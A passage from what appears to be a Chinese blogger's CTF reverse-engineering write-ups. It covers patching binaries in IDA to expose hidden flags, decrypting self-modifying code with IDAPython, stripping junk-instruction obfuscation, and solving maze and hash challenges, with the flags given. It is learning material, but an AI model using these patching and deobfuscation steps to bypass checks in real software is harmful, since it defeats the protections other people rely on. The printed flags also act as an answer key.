0B6h .rdata:00402014 db 0F0h .rdata:00402015 db 80h ; € .rdata:00402016 db 81h .rdata:00402017 db 0A5h .rdata:00402018 db 0E0h .rdata:00402019 db 81h .rdata:0040201A db 0B2h .rdata:0040201B db 0F0h .rdata:0040201C db 80h ; € .rdata:0040201D db 80h ; € .rdata:0040201E db 0A0h .rdata:0040201F db 0E0h .rdata:00402020 db 81h .rdata:00402021 db 0A2h .rdata:00402022 db 72h ; r .rdata:00402023 db 6Fh ; o .rdata:00402024 db 0C1h .rdata:00402025 db 0ABh .rdata:00402026 db 65h ; e .rdata:00402027 db 0E0h .rdata:00402028 db 80h ; € .rdata:00402029 db 0A0h .rdata:0040202A db 0E0h .rdata:0040202B db 81h .rdata:0040202C db 0B4h .rdata:0040202D db 0E0h .rdata:0040202E db 81h .rdata:0040202F db 0A8h .rdata:00402030 db 0C1h .rdata:00402031 db 0A5h .rdata:00402032 db 20h .rdata:00402033 db 0C1h .rdata:00402034 db 0A5h .rdata:00402035 db 0E0h .rdata:00402036 db 81h .rdata:00402037 db 0AEh .rdata:00402038 db 63h ; c .rdata:00402039 db 0C1h .rdata:0040203A db 0AFh .rdata:0040203B db 0E0h .rdata:0040203C db 81h .rdata:0040203D db 0A4h .rdata:0040203E db 0F0h .rdata:0040203F db 80h ; € .rdata:00402040 db 81h .rdata:00402041 db 0A9h .rdata:00402042 db 6Eh ; n .rdata:00402043 db 0C1h .rdata:00402044 db 0A7h .rdata:00402045 db 0C0h .rdata:00402046 db 0BAh .rdata:00402047 db 20h .rdata:00402048 db 49h ; I .rdata:00402049 db 0F0h .rdata:0040204A db 80h ; € .rdata:0040204B db 81h .rdata:0040204C db 9Fh .rdata:0040204D db 0C1h .rdata:0040204E db 0A1h .rdata:0040204F db 0C1h .rdata:00402050 db 9Fh .rdata:00402051 db 0C1h .rdata:00402052 db 8Dh .rdata:00402053 db 0E0h .rdata:00402054 db 81h .rdata:00402055 db 9Fh .rdata:00402056 db 0C1h .rdata:00402057 db 0B4h .rdata:00402058 db 0F0h .rdata:00402059 db 80h ; € .rdata:0040205A db 81h .rdata:0040205B db 9Fh .rdata:0040205C db 0F0h .rdata:0040205D db 80h ; € .rdata:0040205E db 81h .rdata:0040205F db 0A8h .rdata:00402060 db 0C1h .rdata:00402061 db 9Fh .rdata:00402062 db 0F0h .rdata:00402063 db 80h ; € .rdata:00402064 db 81h .rdata:00402065 db 0A5h .rdata:00402066 db 0E0h .rdata:00402067 db 81h .rdata:00402068 db 9Fh .rdata:00402069 db 0C1h .rdata:0040206A db 0A5h .rdata:0040206B db 0E0h .rdata:0040206C db 81h .rdata:0040206D db 9Fh .rdata:0040206E db 0F0h .rdata:0040206F db 80h ; € .rdata:00402070 db 81h .rdata:00402071 db 0AEh .rdata:00402072 db 0C1h .rdata:00402073 db 9Fh .rdata:00402074 db 0F0h .rdata:00402075 db 80h ; € .rdata:00402076 db 81h .rdata:00402077 db 83h .rdata:00402078 db 0C1h .rdata:00402079 db 9Fh .rdata:0040207A db 0E0h .rdata:0040207B db 81h .rdata:0040207C db 0AFh .rdata:0040207D db 0E0h .rdata:0040207E db 81h .rdata:0040207F db 9Fh .rdata:00402080 db 0C1h .rdata:00402081 db 84h .rdata:00402082 db 5Fh ; _ .rdata:00402083 db 0E0h .rdata:00402084 db 81h .rdata:00402085 db 0A9h .rdata:00402086 db 0F0h .rdata:00402087 db 80h ; € .rdata:00402088 db 81h .rdata:00402089 db 9Fh .rdata:0040208A db 6Eh ; n .rdata:0040208B db 0E0h .rdata:0040208C db 81h .rdata:0040208D db 9Fh .rdata:0040208E db 0E0h .rdata:0040208F db 81h .rdata:00402090 db 0A7h .rdata:00402091 db 0E0h .rdata:00402092 db 81h .rdata:00402093 db 80h ; € .rdata:00402094 db 0F0h .rdata:00402095 db 80h ; € .rdata:00402096 db 81h .rdata:00402097 db 0A6h .rdata:00402098 db 0F0h .rdata:00402099 db 80h ; € .rdata:0040209A db 81h .rdata:0040209B db 0ACh .rdata:0040209C db 0E0h .rdata:0040209D db 81h .rdata:0040209E db 0A1h .rdata:0040209F db 0C1h .rdata:004020A0 db 0B2h .rdata:004020A1 db 0C1h .rdata:004020A2 db 0A5h .rdata:004020A3 db 0F0h .rdata:004020A4 db 80h ; € .rdata:004020A5 db 80h ; € .rdata:004020A6 db 0ADh .rdata:004020A7 db 0F0h .rdata:004020A8 db 80h ; € .rdata:004020A9 db 81h .rdata:004020AA db 0AFh .rdata:004020AB db 6Eh ; n .rdata:004020AC db 0C0h .rdata:004020AD db 0AEh .rdata:004020AE db 0F0h .rdata:004020AF db 80h ; € .rdata:004020B0 db 81h .rdata:004020B1 db 0A3h .rdata:004020B2 db 6Fh ; o .rdata:004020B3 db 0F0h .rdata:004020B4 db 80h ; € .rdata:004020B5 db 81h .rdata:004020B6 db 0ADh .rdata:004020B7 db 0 发现问题，这一串数据远不止28位，结合程序运行时的输出后面有个冒号\n推测这串数据后半段就是flag，只是没有输出而已\n于是找到函数sub_401160的汇编代码\n.text:004011C0 push ebp .text:004011C1 mov ebp, esp .text:004011C3 sub esp, 84h .text:004011C9 push 1Ch .text:004011CB push offset unk_402008 .text:004011D0 lea eax, [ebp+Text] .text:004011D6 push eax .text:004011D7 call sub_401160 .text:004011DC add esp, 0Ch .text:004011DF mov [ebp+var_4], eax .text:004011E2 mov ecx, [ebp+var_4] .text:004011E5 mov [ebp+ecx+Text], 0 .text:004011ED push 0 ; uType .text:004011EF push offset Caption ; \u0026quot;Output\u0026quot; .text:004011F4 lea edx, [ebp+Text] .text:004011FA push edx ; lpText .text:004011FB push 0 ; hWnd .text:004011FD call ds:MessageBoxA .text:00401203 xor eax, eax .text:00401205 mov esp, ebp .text:00401207 pop ebp .text:00401208 retn 10h 把第四行push 1ch patch成一个大点的数，这里我写成push 5ch\n然后apply一下，重新打开exe，大功告成！ 0×02 BJDCTF2020 easy 和上道题有异曲同工之处？\ndie查，结果PE32，进ida\n直接定位main函数\nint __cdecl main(int argc, const char **argv, const char **envp) { __time32_t Time; // [esp+10h] [ebp-3F0h] BYREF struct tm *v5; // [esp+3FCh] [ebp-4h] __main(); time(\u0026amp;Time); v5 = localtime(\u0026amp;Time); puts(\u0026quot;Can you find me?\\n\u0026quot;); system(\u0026quot;pause\u0026quot;); return 0; } 各种time给我整蒙了，特意百度查了一下发现好像真没什么用\n和上一题有异曲同工之妙?直接去翻参数列表\n.text:00401725 push ebp .text:00401726 mov ebp, esp .text:00401728 and esp, 0FFFFFFF0h .text:0040172B sub esp, 400h .text:00401731 call ___main .text:00401736 lea eax, [esp+400h+var_3F0] .text:0040173A mov [esp+400h+Time], eax ; Time .text:0040173D call _time .text:00401742 lea eax, [esp+400h+var_3F0] .text:00401746 mov [esp+400h+Time], eax ; Time .text:00401749 call _localtime .text:0040174E mov [esp+400h+var_4], eax .text:00401755 mov [esp+400h+Time], offset Buffer ; \u0026quot;Can you find me?\\n\u0026quot; .text:0040175C call _puts .text:00401761 mov [esp+400h+Time], offset Command ; \u0026quot;pause\u0026quot; .text:00401768 call _system .text:0040176D mov eax, 0 .text:00401772 leave .text:00401773 retn 也没发现什么有用的，毫无头绪\n翻函数列表的时候发现了问题，就是这个_ques函数，\nint ques() { int v0; // edx int result; // eax int v2[50]; // [esp+20h] [ebp-128h] BYREF int v3; // [esp+E8h] [ebp-60h] int v4[10]; // [esp+ECh] [ebp-5Ch] int j; // [esp+114h] [ebp-34h] __int64 v6; // [esp+118h] [ebp-30h] int v7; // [esp+124h] [ebp-24h] int v8; // [esp+128h] [ebp-20h] int i; // [esp+12Ch] [ebp-1Ch] v3 = 2147122737; v4[0] = 140540; v4[1] = -2008399303; v4[2] = 141956; v4[3] = 139457077; v4[4] = 262023; v4[5] = -2008923597; v4[6] = 143749; v4[7] = 2118271985; v4[8] = 143868; for ( i = 0; i \u0026lt;= 4; ++i ) { memset(v2, 0, sizeof(v2)); v8 = 0; v7 = 0; v0 = v4[2 * i]; LODWORD(v6) = *(\u0026amp;v3 + 2 * i); HIDWORD(v6) = v0; while ( v6 \u0026gt; 0 ) { v2[v8++] = v6 % 2; v6 /= 2i64; } for ( j = 50; j \u0026gt;= 0; --j ) { if ( v2[j] ) { if ( v2[j] == 1 ) { putchar(42); ++v7; } } else { putchar(32); ++v7; } if ( !(v7 % 5) ) putchar(32); } result = putchar(10); } return result; } 从感觉上来说一般能看懂的都是有用的，然而按x查交叉引用的时候却显示没有地方调用它\n于是盲猜前面没啥用的各种time函数就是让我patch的，搞他（我这里改了第11行\n.text:00401725 push ebp .text:00401726 mov ebp, esp .text:00401728 and esp, 0FFFFFFF0h .text:0040172B sub esp, 400h .text:00401731 call ___main .text:00401736 lea eax, [esp+400h+var_3F0] .text:0040173A mov [esp+400h+Time], eax ; Time .text:0040173D call _time .text:00401742 lea eax, [esp+400h+var_3F0] .text:00401746 mov [esp+400h+Time], eax ; Time .text:00401749 call _ques ; Keypatch modified this from: .text:00401749 ; call _localtime .text:0040174E mov [esp+400h+var_4], eax .text:00401755 mov [esp+400h+Time], offset Buffer ; \u0026quot;Can you find me?\\n\u0026quot; .text:0040175C call _puts .text:00401761 mov [esp+400h+Time], offset Command ; \u0026quot;pause\u0026quot; .text:00401768 call _system .text:0040176D mov eax, 0 .text:00401772 leave .text:00401773 retn apply一下，然后重新运行exe，成功！\n第二周 2021-11-05\n0×00 从 CNSS 偷来的 SMC SMC是什么?\n看完tips尝试一下\nstring窗口定位主函数\n.text:00408ACE push offset aPleaseInputYou ; \u0026quot;Please input your code(less than 30 cha\u0026quot;... .text:00408AD3 call sub_404629 .text:00408AD8 add esp, 4 .text:00408ADB push 64h ; 'd' .text:00408ADD push offset unk_4DFEF8 .text:00408AE2 push offset aS ; \u0026quot;%s\u0026quot; .text:00408AE7 call sub_4023EC .text:00408AEC add esp, 0Ch .text:00408AEF push offset loc_408B06 .text:00408AF4 push 138h .text:00408AF9 push offset loc_408B06 .text:00408AFE call sub_4022AC .text:00408B03 add esp, 0Ch 定位问题函数sub_4022AC\nint __cdecl sub_4088D0(int a1, int a2, int a3) { int result; // eax int i; // [esp+D0h] [ebp-8h] for ( i = 0; ; ++i ) { result = i; if ( i \u0026gt;= a2 ) break; *(_BYTE *)(i + a3) = byte_4DF000 ^ *(_BYTE *)(i + a1); } return result; } idaPython 搞他\nfrom ida_bytes import * for i in range(0x138): patch_byte(0x408B06+i,get_byte(0x408B06+i)^74) 按照步骤来到函数头CreatFonction，结果就出问题了\n报错 .text:00408B19: The function has undefined instruction/data at the specified address. Your request has been put in the autoanalysis queue. 开始以为是前面哪里做错了，又重复了几遍，一样的结果\n请教RX大神发现问题\n.text:00408B06 mov dword ptr [ebp-0Ch], 1 .text:00408B0D mov dword ptr [ebp-8], 1 .text:00408B14 push 4DFEF8h .text:00408B14 ; --------------------------------------------------------------------------- .text:00408B19 db 0E8h .text:00408B1A retn 0FF95h .text:00408B1A ; --------------------------------------------------------------------------- .text:00408B1D db 0FFh 这里ida识别错了\n按c重新识别为code，一切正常了\n重新CreateFunction接F5终于看到主函数\nint __cdecl main_0(int argc, const char **argv, const char **envp) { signed int j; // [esp+D4h] [ebp-3Ch] int i; // [esp+E0h] [ebp-30h] char v6; // [esp+EFh] [ebp-21h] signed int v7; // [esp+F8h] [ebp-18h] int v8; // [esp+104h] [ebp-Ch] int v9; // [esp+108h] [ebp-8h] sub_404629(\u0026quot;Please input your code(less than 30 characters): \u0026quot;); sub_4023EC(\u0026quot;%s\u0026quot;, Str); sub_4022AC((int)\u0026amp;loc_408B06, 312, (int)\u0026amp;loc_408B06); v8 = 1; v9 = 1; v7 = j__strlen(Str); v6 = 0; if ( v7 == 23 ) { for ( i = 0; i \u0026lt; 23; ++i ) { switch ( Str[i] ) { case 'a': --v9; break; case 'd': ++v9; break; case 's': ++v8; break; case 'w': --v8; break; default: break; } if ( aSE[8 * v8 + v9] == 35 ) break; if ( aSE[8 * v8 + v9] == 69 ) { v6 = 1; break; } } } if ( v6 ) { for ( j = 0; j \u0026lt; v7; ++j ) byte_4DF04C[j] ^= Str[j]; sub_404629(\u0026quot;%s\\n\u0026quot;); } j__system(\u0026quot;pause\u0026quot;); return 0; } 经典地图题,aSE数组存地图，加回车得地图\n######## #S # # ## # # ##### # # ## # ####E# # # ######## w s a d十分人性化，好评\n第一次用py写脚本\nkey = \u0026quot;dsddwddssasaaaassdddddw\u0026quot; magic = [39, 61, 55, 55, 12, 33, 5, 70, 10, 62, 32, 44, 34, 62,71, 44, 18, 59, 41, 5, 86, 1, 10] for i in range(0,23): print( chr( magic[i] ^ ord(key[i]) ), end=\u0026quot;\u0026quot;) # CNSS{Ea5y_SMC_\u0026amp;_a_Ma2e} 0×01 ByteCTF 2020 AWD TikTokAdmin 简单花指令\n题目劝退，学习了一波花指令是啥再来做题\n根据题目，在string窗口查找Delete，找到了发生错误的部分\n.text:00000000000080D4 loc_80D4: ; CODE XREF: .text:000000000000805C↑j .text:00000000000080D4 lea rsi, aWeNeedToReconf ; \u0026quot;We need to reconfirm the authority!\u0026quot; .text:00000000000080DB lea rdi, _ZSt4cout ; std::cout .text:00000000000080E2 call __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(std::ostream \u0026amp;,char const*) .text:00000000000080E7 mov rdx, rax .text:00000000000080EA mov rax, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr .text:00000000000080F1 mov rsi, rax .text:00000000000080F4 mov rdi, rdx .text:00000000000080F7 call __ZNSolsEPFRSoS_E ; std::ostream::operator\u0026lt;\u0026lt;(std::ostream \u0026amp; (*)(std::ostream \u0026amp;)) .text:00000000000080FC lea rsi, aPleaseInputThe ; \u0026quot;Please input the super root's password:\u0026quot;... .text:0000000000008103 mov rdi, rax .text:0000000000008106 call __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(std::ostream \u0026amp;,char const*) .text:000000000000810B lea rax, [rbp-90h] .text:0000000000008112 mov rsi, rax .text:0000000000008115 lea rdi, _ZSt3cin ; std::cin .text:000000000000811C call __ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE ; std::operator\u0026gt;\u0026gt;\u0026lt;char\u0026gt;(std::istream \u0026amp;,std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; \u0026amp;) .text:0000000000008121 jz short near ptr loc_8125+1 .text:0000000000008123 jnz short near ptr loc_8125+1 .text:0000000000008125 .text:0000000000008125 loc_8125: ; CODE XREF: .text:0000000000008121↑j .text:0000000000008125 ; .text:0000000000008123↑j .text:0000000000008125 call near ptr 70860E72h .text:0000000000008125 ; --------------------------------------------------------------------------- .text:000000000000812A dw 0FFFFh, 48FFh, 0C789h .text:0000000000008130 dq 0C38948FFFFB56BE8h, 48FFFFFF70858D48h, 48FFFFB489E8C789h .text:0000000000008130 dq 8948B0458D48C189h, 0E8C78948CE8948DAh, 0B0458D48FFFFB584h .text:0000000000008130 dq 358D480000000DBAh, 0E8C7894800007B1Dh, 840FC085FFFFB48Ch .text:0000000000008130 dq 14358D48000000F6h, 0DEF63D8D4800007Bh, 48FFFFB5E1E80000h .text:0000000000008130 dq 8948B0458D48C289h, 0FFB5CFE8D78948C6h, 7AFD358D48FFh 问题出在了jz（为0跳转）和jnz（不为0跳转）同时存在，并插入了0xE8（call的机器码）使ida识别出错\n解决方法先把call按u改成未定义,效果如图\n.text:0000000000008125 db 0E8h .text:0000000000008126 unk_8126 db 48h ; H ; CODE XREF: .text:0000000000008121↑j .text:0000000000008126 ; .text:0000000000008123↑j .text:0000000000008127 db 8Dh .text:0000000000008128 db 85h .text:0000000000008129 db 70h ; p .text:000000000000812A dw 0FFFFh, 48FFh, 0C789h 然后把0xE8 patch成nop（空），其他数据按c重新分析成代码\n.text:0000000000008123 ; --------------------------------------------------------------------------- .text:0000000000008125 db 90h ; Keypatch modified this from: .text:0000000000008125 ; db 0E8h .text:0000000000008125 ; Keypatch padded NOP to next boundary: 1 bytes .text:0000000000008126 ; --------------------------------------------------------------------------- .text:0000000000008126 .text:0000000000008126 loc_8126: ; CODE XREF: .text:0000000000008121↑j .text:0000000000008126 ; .text:0000000000008123↑j .text:0000000000008126 lea rax, [rbp-90h] .text:000000000000812D mov rdi, rax .text:0000000000008130 call __ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE4sizeEv ; std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::size(void) .text:0000000000008135 mov rbx, rax .text:0000000000008138 lea rax, [rbp-90h] .text:000000000000813F mov rdi, rax .text:0000000000008142 call __ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv ; std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::c_str(void) .text:0000000000008147 mov rcx, rax .text:000000000000814A lea rax, [rbp-50h] .text:000000000000814E mov rdx, rbx .text:0000000000008151 mov rsi, rcx 然后发现下面还有一个一样的错误，相同办法解决\n最后来到函数头Create Function，\n完事后到虚拟机上看一眼\ndx3906@ubuntu:~/Desktop$ '/home/dx3906/pwn.so' '--''' ' l__++??_'' ;??JCLCQj( ;?{BB%@@p0,^' I-{\u0026amp;B@@B@q+'- ;?}8@%$@@Bb;- ' ;?}8@$$@$$B\u0026amp;r^-'' ;?}%@@@B$$B@B8O?~:- ';?}8@B@@$@$$$$$BBpO{ ' ''' ';?}8@B@BBB@@@@@B@pw( ^l+?][I' ;?}8@@%MwOa%@@$@Bdq1 '',?-_?_)uZ0c~';_}%@@@MqJ^IcOwmbqq) ''^:?_+]w\u0026amp;B@@@am( ;-[8@@@MqJ^ '\u0026quot;\u0026gt;[|i ^\u0026lt;--}MB@@@@@@am( ;-[8@$$WqJ-' ''' '' '?]+C%@@$@8#aobq)':_[%@@@WqU-' '-i]}m@BB%*qd0Q0cU}^I+[%@@@MwU- '^[?n%B@@aqwL:-^'-\u0026quot;-I+[%@@@MwU- ^-_#@$$%wpx- ';+[B@@@MwU- ^]-B$@@%pq\u0026quot;'' '\u0026lt;_{8@@BMmC- -^??8$$@@kO, '---1%@$@aqU- '-\u0026gt;-#@$@BBo\u0026gt;'''-'^:?-?h$$$8mwt '+YBB@@$8\u0026amp;Q-!_]+_[]*$BBBqwqI ''\u0026quot;[\u0026amp;B@@$@@%8WJ/npMB%B@%qwq} '';M@@@@@$@@B@@@@@@@MmpO]-' '^;_88@@@@B@B@$B\u0026amp;oqqqC\u0026quot; ^' -l}mbo\u0026amp;8\u0026amp;\u0026amp;oqmdwZQ:-' -^~nOwqpZz[I\u0026quot;'' ' ''''-''' ████████╗██╗██╗ ██╗████████╗ ██████╗ ██╗ ██╗ ╚══██╔══╝██║██║ ██╔╝╚══██╔══╝██╔═══██╗██║ ██╔╝ ██║ ██║█████╔╝ ██║ ██║ ██║█████╔╝ ██║ ██║██╔═██╗ ██║ ██║ ██║██╔═██╗ ██║ ██║██║ ██╗ ██║ ╚██████╔╝██║ ██╗ ╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═╝ This is the background management system for TikTok. PassWord: 还挺不错，可惜要password\n原本是想找一找的，结果看到代码发现我想多了，就先到这吧\n0×02 BJDCTF 2020 老八的小汉堡 游戏真不错，但题实话说属于没题解不会做系列（\n下了个dnspy，根据题解打开Data/Managed目录下的Assembly-CSharp.dll\n搜索字符串“美汁汁”定位主函数 public class ButtonSpawnFruit : MonoBehaviour { // Token: 0x0600000A RID: 10 RVA: 0x00002110 File Offset: 0x00000310 public static string Md5(string str) { byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = MD5.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\u0026quot;X2\u0026quot;)); } return stringBuilder.ToString().Substring(0, 20); } // Token: 0x0600000B RID: 11 RVA: 0x00002170 File Offset: 0x00000370 public static string Sha1(string str) { byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = SHA1.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\u0026quot;X2\u0026quot;)); } return stringBuilder.ToString(); } // Token: 0x0600000C RID: 12 RVA: 0x000021C8 File Offset: 0x000003C8 public void Spawn() { FruitSpawner component = GameObject.FindWithTag(\u0026quot;GameController\u0026quot;).GetComponent\u0026lt;FruitSpawner\u0026gt;(); if (component) { if (this.audioSources.Length != 0) { this.audioSources[Random.Range(0, this.audioSources.Length)].Play(); } component.Spawn(this.toSpawn); string name = this.toSpawn.name; if (name == \u0026quot;汉堡底\u0026quot; \u0026amp;\u0026amp; Init.spawnCount == 0) { Init.secret += 997; } else if (name == \u0026quot;鸭屁股\u0026quot;) { Init.secret -= 127; } else if (name == \u0026quot;胡罗贝\u0026quot;) { Init.secret *= 3; } else if (name == \u0026quot;臭豆腐\u0026quot;) { Init.secret ^= 18; } else if (name == \u0026quot;俘虏\u0026quot;) { Init.secret += 29; } else if (name == \u0026quot;白拆\u0026quot;) { Init.secret -= 47; } else if (name == \u0026quot;美汁汁\u0026quot;) { Init.secret *= 5; } else if (name == \u0026quot;柠檬\u0026quot;) { Init.secret ^= 87; } else if (name == \u0026quot;汉堡顶\u0026quot; \u0026amp;\u0026amp; Init.spawnCount == 5) { Init.secret ^= 127; string str = Init.secret.ToString(); if (ButtonSpawnFruit.Sha1(str) == \u0026quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7\u0026quot;) { this.result = \u0026quot;BJDCTF{\u0026quot; + ButtonSpawnFruit.Md5(str) + \u0026quot;}\u0026quot;; Debug.Log(this.result); } } Init.spawnCount++; Debug.Log(Init.secret); Debug.Log(Init.spawnCount); } } 基本思路是已知sha1(str)==DD01903921EA24941C26A48F2CEC24E0BB0E8CC7,求md5(str)\n还是根据题解上cmd5.com得str==1001\n然后md5加密，注意这一句，取加密后的0-20（不包括20）即前20位（前人之鉴属于是\nreturn stringBuilder.ToString().Substring(0, 20) ipython跑一遍得flag\nIn [1]: from hashlib import md5 In [2]: a=md5() In [3]: a.update(b\u0026quot;1001\u0026quot;) In [4]: print(\u0026quot;BJDCTF{\u0026quot;+a.hexdigest()[:20]+\u0026quot;}\u0026quot;) BJDCTF{b8c37e33defde51cf91e} 总结：这周题真是给我开眼界的（\n第一周 2021-10-31\n写在前面：\n新人第一次发帖，多多指教\n长篇幅警告，写得比较繁琐\n主要记录自己的做题过程，当然还有水水水\n0x00 DMCTF 2020 re1 来点简单的算法甜点\n解压后只有一个exe文件，先运行看看\n提示输入flag，乱输提示 wrong flag！\nflag:134123421 wrong flag! 请按任意键继续. . . 拖进die，无壳，进ida\n看不懂汇编，直接F5，进main_0函数\nint __cdecl main_0(int argc, const char **argv, const char **envp) { char Str; // [esp+DCh] [ebp-40h] BYREF char v5[54]; // [esp+DDh] [ebp-3Fh] BYREF __CheckForDebuggerJustMyCode(\u0026amp;unk_5E0029); Str = 0; j__memset(v5, 0, sizeof(v5)); sub_485257(\u0026quot;flag:\u0026quot;); sub_484CF3(\u0026amp;dword_5DD268, \u0026amp;Str); if ( sub_485D1A(\u0026amp;Str) ) sub_4849EC(\u0026amp;Str); else sub_485257(\u0026quot;wrong flag!\\n\u0026quot;); sub_488209(\u0026quot;pause\u0026quot;); return 0; } 发现有用的主要在if else\n先进if判断条件函数sub_485D1A\nBOOL __cdecl sub_49BE80(char *Str) { __CheckForDebuggerJustMyCode(\u0026amp;unk_5E0029); return j__strlen(Str) == 20; } 第一行看不懂也感觉没用，直接忽略，第二行限制输入为20个字符\n回来再进if下函数sub_4849EC\nint __cdecl sub_49AE10(char *Str1) { int result; // eax int i; // [esp+D0h] [ebp-2Ch] char Str2[28]; // [esp+DCh] [ebp-20h] BYREF __CheckForDebuggerJustMyCode(\u0026amp;unk_5E0029); strcpy(Str2, \u0026quot;fmesh{umkc_vlrn_glh}\u0026quot;); for ( i = 0; i \u0026lt;= 19; ++i ) { if ( Str1[i] \u0026lt; 97 || Str1[i] \u0026gt;= 108 ) { if ( Str1[i] \u0026gt; 110 \u0026amp;\u0026amp; Str1[i] \u0026lt;= 122 ) --Str1[i]; } else { Str1[i] += 2; } } if ( !j__strcmp(Str1, Str2) ) result = sub_485257(\u0026quot;congratulations!\\n\u0026quot;); else result = sub_485257(\u0026quot;wrong flag!\\n\u0026quot;); return result; } 发现是个简单的加密\n加改成减，减改成加，逆写得到flag，粘个代码\n#include\u0026lt;cstdio\u0026gt; char Str1[]=\u0026quot;fmesh{umkc_vlrn_glh}\u0026quot;; int main(){ for(int i=0;i\u0026lt;=19;i++){ if ( Str1[i] \u0026lt; 97 || Str1[i] \u0026gt;= 108 ){ if ( Str1[i] \u0026gt; 110 \u0026amp;\u0026amp; Str1[i] \u0026lt;= 122 ) Str1[i]++; } else{ Str1[i] -= 2; } } puts(Str1); } //flag:dmctf{vmia_wlsn_elf} 然而据说这题多解，咱也不知道，咱也不敢问\n0x01 DMCTF 2020 re4 “最短路径”\n直接打开exe，输入key闪退差评\ncmd打开\nC:\\Users\\DX3906\u0026gt;D:\\DX3906\\下载\\12345\\12345.exe key:1234123 failed. failed. failed. failed. failed. failed. failed. failed. 8个failed直呼好狠\ndie查壳：无，拖进ida\n直接F5，找不到主函数\nvoid __noreturn start() { _set_app_type(_crt_console_app); sub_4011B0(); } 打开string窗口\n.rdata:00405000 00000013 C libgcc_s_dw2-1.dll .rdata:00405013 00000016 C __register_frame_info .rdata:00405029 00000018 C __deregister_frame_info .rdata:00405041 0000000E C libgcj-16.dll .rdata:0040504F 00000014 C _Jv_RegisterClasses .rdata:0040506A 00000008 C failed. .rdata:00405072 0000000A C flag{%s}\\n .rdata:00405080 00000018 C Mingw runtime failure:\\n .rdata:00405098 00000031 C VirtualQuery failed for %d bytes at address %p .rdata:004050CC 00000032 C Unknown pseudo relocation protocol version %d.\\n .rdata:00405100 0000002A C Unknown pseudo relocation bit size %d.\\n 映入眼帘就是failed\n点他——\nrdata:0040506A Buffer db 'failed.',0 ; DATA XREF: sub_401460:loc_4015A3↑o\n发现函数sub_401460，点他弹出来汇编，再F5，终于进了真的主函数\nint sub_401460() { int v0; // eax char Buffer[51]; // [esp+3Dh] [ebp-43h] BYREF int v3; // [esp+70h] [ebp-10h] int i; // [esp+74h] [ebp-Ch] int v5; // [esp+78h] [ebp-8h] int v6; // [esp+7Ch] [ebp-4h] sub_401BD0(); printf(\u0026quot;key:\u0026quot;); fgets(Buffer, 50, (FILE *)iob[0]._ptr); v3 = strlen(Buffer); if ( Buffer[v3 - 1] == 10 ) Buffer[v3 - 1] = 0; --v3; v6 = 0; v5 = 0; for ( i = 0; i \u0026lt; v3; ++i ) { v0 = Buffer[i]; if ( v0 == 0x31 ) { --v5; } else if ( v0 \u0026gt; 49 ) { if ( v0 == 50 ) { ++v6; } else { if ( v0 != 51 ) { LABEL_16: puts(\u0026quot;failed.\u0026quot;); goto LABEL_17; } --v6; } } else { if ( v0 != 48 ) goto LABEL_16; ++v5; } LABEL_17: if ( !byte_404020[10 * v6 + v5] || v6 \u0026lt; 0 || v5 \u0026lt; 0 || v6 \u0026gt; 9 || v5 \u0026gt; 9 ) puts(\u0026quot;failed.\u0026quot;); } if ( v6 == 9 \u0026amp;\u0026amp; v5 == 9 ) printf(\u0026quot;flag{%s}\\n\u0026quot;, Buffer); return 0; } 观察LABEL_17中if的判断条件，咋看咋像迷宫题，v6表示行，v5表示列，0-9共10行10列\n进数组byte_404020，数据都是0和1，更加确信迷宫\n.data:00404020 byte_404020 db 1 ; DATA XREF: sub_401460+164↑r .data:00404021 db 0 .data:00404022 db 0 .data:00404023 db 0 .data:00404024 db 0 .data:00404025 db 1 .data:00404026 db 1 .data:00404027 db 0 .data:00404028 db 0 .data:00404029 db 0 .data:0040402A db 1 .data:0040402B db 1 .data:0040402C db 0 .data:0040402D db 0 .data:0040402E db 0 .data:0040402F db 1 .data:00404030 db 1 .data:00404031 db 1 .data:00404032 db 0 但，这要我一个个扣出来？？\n右键选择Array\n然后把size改成100（10行10列共100个数\n舒服~\n.data:00404020 byte_404020 db 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1; 0 .data:00404020 ; DATA XREF: sub_401460+164↑r .data:00404020 db 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1; 18 .data:00404020 db 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0; 36 .data:00404020 db 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0; 54 .data:00404020 db 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1; 72 .data:00404020 db 0, 0, 0, 0, 0, 0, 0, 0, 0, 1; 90 复制粘贴出迷宫\n1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 